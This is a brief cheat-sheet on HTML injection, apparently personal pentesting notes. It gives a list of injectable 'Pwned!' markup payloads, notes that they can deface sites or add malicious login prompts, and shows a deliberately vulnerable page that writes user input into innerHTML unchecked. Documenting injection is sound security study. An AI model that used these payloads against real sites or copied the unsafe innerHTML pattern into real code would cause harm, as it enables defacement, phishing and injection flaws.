
> [!NOTE] Note
> This can be used to deface websites or create added on malicious login prompts

## Payloads
```html
<h1>Pwned!</h1>
<pre>Pwned!</pre>
<i>Pwned!</i>
<a href="http://adot8.com">Pwned!</a> 
<article><h2>Pwned!</h2></article>
<button type="button">Click Me!</button>
<svg width="100" height="100"><circle cx="50" cy="50" r="40" stroke="green" stroke-width="4" fill="yellow" /></svg>
<audio controls><source src="demo.ogg" type="audio/ogg"><source src="demo.mp3" type="audio/mpeg"></audio>
<video width="320" height="240" controls></video>
 
```

## No input validation

```html
<!DOCTYPE html>
<html>

<body>
    <button onclick="inputFunction()">Click to enter your name</button>
    <p id="output"></p>

    <script>
        function inputFunction() {
            var input = prompt("Say something!", "");

            if (input != null) {
                document.getElementById("output").innerHTML = "You said" + input;
            }
        }
    </script>
</body>

</html>

```

